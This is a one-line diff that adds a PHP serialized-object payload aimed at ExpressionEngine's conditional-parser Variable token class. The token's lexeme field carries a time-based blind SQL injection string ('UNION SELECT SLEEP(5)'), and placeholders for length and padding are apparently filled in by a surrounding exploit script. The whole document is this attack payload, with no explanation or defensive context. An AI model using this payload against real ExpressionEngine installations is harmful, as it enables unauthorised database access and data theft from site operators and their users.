@@ -1,0 +1,1 @@
+a:1:{s:+13:":new:username";O:67:"EllisLab\\\ExpressionEngine\\\Library\\\Parser\\\Conditional\\\Token\\\Variable":1:{s:+6:"lexeme";s:+'.$length.':"1+UNION+SELECT+SLEEP(5)+#+'.$garbage.'";}}
